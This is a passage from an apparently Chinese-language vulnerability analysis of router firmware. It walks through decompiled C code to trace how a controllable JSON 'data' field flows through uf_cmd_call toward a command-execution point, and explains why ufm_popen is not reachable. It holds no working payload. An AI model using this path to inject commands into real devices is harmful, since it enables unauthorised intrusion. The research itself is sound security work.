== <span class="number">49</span> || !<span class="built_in">strcmp</span>(v37, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">46</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v38);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------not_commit:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">538</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">46</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;execute&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v39 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v40 = v39;</span><br><span class="line">    <span class="keyword">if</span> ( v39 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v39 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v39, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">42</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v40);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v41 = ptr_2;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;data&quot;</span>, &amp;params_module) == <span class="number">1</span></span><br><span class="line">    &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">4</span>) &lt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v42 )</span><br><span class="line">    &#123;</span><br><span class="line">      v43 = strdup(v42);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">12</span>) = v43;</span><br><span class="line">      <span class="keyword">if</span> ( !v43 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v41;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>处理data的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;data&quot;</span>, &amp;params_module) == <span class="number">1</span></span><br><span class="line">  &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">4</span>) &lt; <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v42 = json_object_get_string(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">  &#123;</span><br><span class="line">    v43 = strdup(v42);</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">12</span>) = v43;</span><br><span class="line">    <span class="keyword">if</span> ( !v43 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码从 JSON 对象 <code>params</code> 中提取 “data” 字段，并检查其类型是否为字符串、数组或对象。如果是字符串类型，则复制字符串并将其指针存储在指定的位置。如果内存分配失败，则跳转到错误处理代码。</p><blockquote><ol><li><code>json_type_null</code> (值为 0)</li><li><code>json_type_boolean</code> (值为 1)</li><li><code>json_type_double</code> (值为 2)</li><li><code>json_type_int</code> (值为 3)</li><li><code>json_type_object</code> (值为 4)</li><li><code>json_type_array</code> (值为 5)</li><li><code>json_type_string</code> (值为 6)</li></ol></blockquote><p>这边记住可控字段的偏移12</p><p>到了之后有一个<code>uf_cmd_call</code>函数，乍一看感觉有命令执行点，因此跟进，寻找命令执行点</p><h5 id="ufm-popen"><a href="#ufm-popen" class="headerlink" title="ufm_popen"></a>ufm_popen</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_popen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $s4</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">51200</span>]; <span class="comment">// [sp+28h] [-C808h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+C828h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_435F30);</span><br><span class="line">  v4 = popen(a1, <span class="string">&quot;r&quot;</span>);                           <span class="comment">//执行a1指向的shell命令</span></span><br><span class="line">  pthread_mutex_unlock(&amp;unk_435F30);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd[%s] open failed!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">47</span>, a1);</span><br><span class="line">    v6 = (_DWORD *)_errno_location();</span><br><span class="line">    v5 = (<span class="type">const</span> <span class="type">char</span> *)strerror(*v6);</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)popen failed. %s, with errno %d.&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">48</span>, v5, *v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="number">512</span>;</span><br><span class="line">  v7 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">  *a2 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">55</span>);</span><br><span class="line">    pclose(v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *v7 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">    <span class="keyword">if</span> ( fgets(v10, <span class="number">51200</span>, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_str_append(a2, v10, &amp;v11);</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(*a2) &gt;= <span class="number">0x9C4001</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)string oversize!&quot;</span>, <span class="string">&quot;ufm_common.c&quot;</span>, <span class="string">&quot;ufm_popen&quot;</span>, <span class="number">69</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*a2);</span><br><span class="line">    *a2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_mutex_lock(<span class="number">4415280</span>);</span><br><span class="line">  pclose(v4);</span><br><span class="line">  pthread_mutex_unlock(<span class="number">4415280</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这个函数其实是执行不到的，让我娓娓道来</p><h4 id="uf-cmd-call"><a href="#uf-cmd-call" class="headerlink" title="uf_cmd_call"></a>uf_cmd_call</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_cmd_call</span><span class="params">(<span class="type">int</span> addr, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line"> .........</span><br><span class="line">  v16 = *(<span class="type">unsigned</span> __int8 *)(addr + <span class="number">45</span>);        <span class="comment">// 没有特别设置就是0</span></span><br><span class="line">  HIBYTE(_20_23_is_data[<span class="number">4</span>]) = v13 != <span class="number">5</span>;</span><br><span class="line">  _20_23_is_data[<span class="number">5</span>] = v15;</span><br><span class="line">  v17 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">8</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">0</span>] = addr;</span><br><span class="line">  _20_23_is_data[<span class="number">14</span>] = (<span class="type">int</span>)v17;</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )               <span class="comment">//这个直接执行</span></span><br><span class="line">  &#123;</span><br><span class="line">    _20_23_is_data[<span class="number">20</span>] = *(_DWORD *)(addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_86;    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>因此会直接跳到LABEL_86</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line">LABEL_86:</span><br><span class="line">  addr_20 = *(_DWORD *)(addr + <span class="number">20</span>);</span><br><span class="line">  LOBYTE(_20_23_is_data[<span class="number">1</span>]) = *(_BYTE *)(addr + <span class="number">41</span>);</span><br><span class="line">  addr_40 = *(_BYTE *)(addr + <span class="number">40</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">2</span>] = addr_20;</span><br><span class="line">  addr_32 = *(_DWORD *)(addr + <span class="number">32</span>);</span><br><span class="line">  BYTE1(_20_23_is_data[<span class="number">1</span>]) = addr_40;</span><br><span class="line">  addr_43 = *(_BYTE *)(addr + <span class="number">43</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">18</span>] = addr_32;</span><br><span class="line">  addr_24 = *(_DWORD *)(addr + <span class="number">24</span>);</span><br><span class="line">  BYTE1(_20_23_is_data[<span class="number">4</span>]) = addr_43;</span><br><span class="line">  addr_44 = *(_BYTE *)(addr + <span class="number">44</span>);</span><br><span class="line">  _20_23_is_data[<span class="number">3</span>] = addr_24;</span><br><span class="line">  addr_0 = *(_DWORD *)addr;</span><br><span class="line">  BYTE2(_20_23_is_data[<span class="number">4</span>]) = addr_44;</span><br><span class="line">  _20_23_is_data[<span class="number">7</span>] = addr_0;                   <span class="comment">// 7这个位置=addr[0]的值</span></span><br><span class="line">  <span class="keyword">if</span> ( g_info &amp;&amp; !addr_0 )</span><br><span class="line">    _20_23_is_data[<span class="number">7</span>] = <span class="number">1</span>;</span><br><span class="line">  data_2 = (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">20</span>];</span><br><span class="line">  LOBYTE(_20_23_is_data[<span class="number">8</span>]) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">20</span>] )                    <span class="comment">// 不会进去</span></span><br><span class="line">  &#123;</span><br><span class="line">    v52 = _20_23_is_data[<span class="number">5</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;set&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;add&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;del&quot;</span>) || !<span class="built_in">strcmp</span>(v52, <span class="string">&quot;update&quot;</span>) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_93;</span><br><span class="line">    v53 = (<span class="type">int</span> *)addr;</span><br><span class="line">    <span class="keyword">if</span> ( _20_23_is_data[<span class="number">7</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_172:</span><br><span class="line">      v75 = *v53;</span><br><span class="line">LABEL_173:</span><br><span class="line">      <span class="keyword">if</span> ( !v75 &amp;&amp; g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)para networkId:%s, groupId:%s!&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">          <span class="number">538</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">9</span>],</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">10</span>]);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">5</span>], <span class="string">&quot;get&quot;</span>)</span><br><span class="line">        &amp;&amp; ((v76 = _20_23_is_data[<span class="number">14</span>], !<span class="built_in">strcmp</span>(_20_23_is_data[<span class="number">14</span>], <span class="string">&quot;configPath&quot;</span>))</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configVersion&quot;</span>)</span><br><span class="line">         || !<span class="built_in">strcmp</span>(v76, <span class="string">&quot;configDefault&quot;</span>)) )</span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">15</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !_20_23_is_data[<span class="number">15</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">goto</span> LABEL_184;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v77 = _20_23_is_data[<span class="number">14</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      _20_23_is_data[<span class="number">24</span>] = find_module_info(v77, &amp;_20_23_is_data[<span class="number">26</span>]);</span><br><span class="line">      v78 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">LABEL_184:</span><br><span class="line">      <span class="keyword">if</span> ( v78 )</span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_BYTE *)(_20_23_is_data[<span class="number">0</span>] + <span class="number">48</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          pthread_mutex_lock(v78 + <span class="number">112</span>);</span><br><span class="line">          v98 = _20_23_is_data[<span class="number">24</span>];</span><br><span class="line">          <span class="keyword">if</span> ( _sigsetjmp(v96, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            pthread_mutex_unlock(v98 + <span class="number">112</span>);</span><br><span class="line">            _pthread_unwind_next(v96);</span><br><span class="line">          &#125;</span><br><span class="line">          _pthread_register_cancel(v96);</span><br><span class="line">          v80 = *(<span class="type">const</span> <span class="type">char</span> **)(addr + <span class="number">12</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v80 &amp;&amp; *v80 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">              uf_log_printf(</span><br><span class="line">                uf_log,</span><br><span class="line">                <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">                <span class="number">579</span>,</span><br><span class="line">                uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">                (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">                v80,</span><br><span class="line">                _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(</span><br><span class="line">              uf_log,</span><br><span class="line">              <span class="string">&quot;(%s %s %d)%s %s -m %s [mutex:%d]&quot;</span>,</span><br><span class="line">              <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">              <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">              <span class="number">583</span>,</span><br><span class="line">              uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">              (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">              _20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          v95 = ufm_handle((<span class="type">int</span>)_20_23_is_data);<span class="comment">// 命令执行点</span></span><br><span class="line">          pthread_mutex_unlock(_20_23_is_data[<span class="number">24</span>] + <span class="number">112</span>);</span><br><span class="line">          _pthread_unregister_cancel(v96);</span><br><span class="line">LABEL_211:</span><br><span class="line">          v82 = addr;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_212;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v79 = addr;</span><br><span class="line">      &#125;</span><br><span class="line">      v81 = *(<span class="type">const</span> <span class="type">char</span> **)(v79 + <span class="number">12</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v81 &amp;&amp; *v81 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( HIBYTE(_20_23_is_data[<span class="number">4</span>]) &amp;&amp; g_debug &gt;= <span class="number">2</span> || g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">          uf_log_printf(</span><br><span class="line">            uf_log,</span><br><span class="line">            <span class="string">&quot;(%s %s %d)%s %s -m %s &#x27;%s&#x27; [mutex:%d]&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ufm_lib.c&quot;</span>,</span><br><span class="line">            <span class="string">&quot;uf_cmd_call&quot;</span>,</span><br><span class="line">            <span class="number">593</span>,</span><br><span class="line">            uf_call_type_str[_20_23_is_data[<span class="number">7</span>]],</span><br><span class="line">            (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">5</span>],</span><br><span class="line">            (<span class="type">const</span> <span class="type">char</span> *)_20_23_is_data[<span class="number">14</span>],</span><br><span class="line">            